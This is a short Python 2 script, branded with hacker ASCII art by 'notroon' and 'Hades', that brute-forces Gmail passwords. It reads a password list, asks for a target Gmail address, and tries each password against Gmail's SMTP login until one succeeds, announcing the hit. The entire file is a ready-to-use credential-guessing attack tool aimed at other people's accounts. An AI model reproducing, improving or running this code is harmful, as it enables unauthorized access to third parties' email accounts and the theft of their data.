#!/usr/bin/python
'''code notroon + Hades'''

import smtplib
from os import system

def main():
   print '============================'
   print '  notroon |wearenothacker|  '
   print '============================'
   print '++++++++++++++++++++++++++++'
   print '     DATE:2020              '
   print '     POWER:HADES            '
   print '     ⓌⒺ คŘᗴ 𝔫𝕆𝕥 ʰΔ𝔠𝓚ｅ𝕣     '
   print '     ░n░o░t░r░o░o░n░   '
   print '███░▒▓███████▓▒░█.'
   print '▀▄▀▄▀▄▀N▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀o▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀T▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀R▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀O▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀O▀▄▀▄▀▄▀▄▀ '
   print '▀▄▀▄▀▄▀N▀▄▀▄▀▄▀▄▀ '
   print '▁▂▄▅ ▆ ▇ █ ▇ ▆ ▅▄▂▁ '
   print '▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀.'
   print '     [     H       ]        '
   print '     [     A       ]        '
   print '     [     D       ]        '
   print '     [     E       ]        '
   print '     [     S       ]        '
   print '============================'
   print '█ █ █ □ □ □ □ □ □ □ □.'
   print '█ █ █ █ █ █ □ □ □ □ □.'
   print '█ █ █ █ █ █ █ █ █ □ □.'
   print '█ █ █ █ █ █ █ █ █ █ █.' 
   print '░▒▓█►─═  ☆☆ ═─◄█▓▒░.'

main()
print '[1] start'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('chose a password list:')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('Enter Gmail target:')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] we join , password :' + password + '     ☆Notroon☆'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] we join , password :' + password + '  ☆Notroon☆'

            break
         else:
            print '[!] not password finde. use other password list => ' + password
login()
